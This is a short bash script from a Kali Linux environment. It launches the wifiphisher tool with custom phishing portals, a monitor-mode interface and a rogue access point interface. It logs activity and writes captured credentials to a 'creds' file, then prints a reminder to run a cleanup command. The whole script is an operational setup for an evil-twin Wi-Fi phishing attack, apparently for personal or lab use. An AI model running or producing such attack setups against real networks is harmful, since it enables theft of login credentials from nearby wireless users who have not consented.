#!/bin/bash
# source /home/kali/.aliases

# sudo /home/kali/scripts/initwifi.sh
sudo wifiphisher -pPD /home/kali/working/phisher/portals -eI wlan1mon -aI wlan1ap --logging -lP /home/kali/working/phisher/logs/log -cP /home/kali/working/phisher/creds/cred
#sudo systemctl restart hotspot
echo 'remember to cleanup with this command if finished:'
echo 'cleanupwifi'

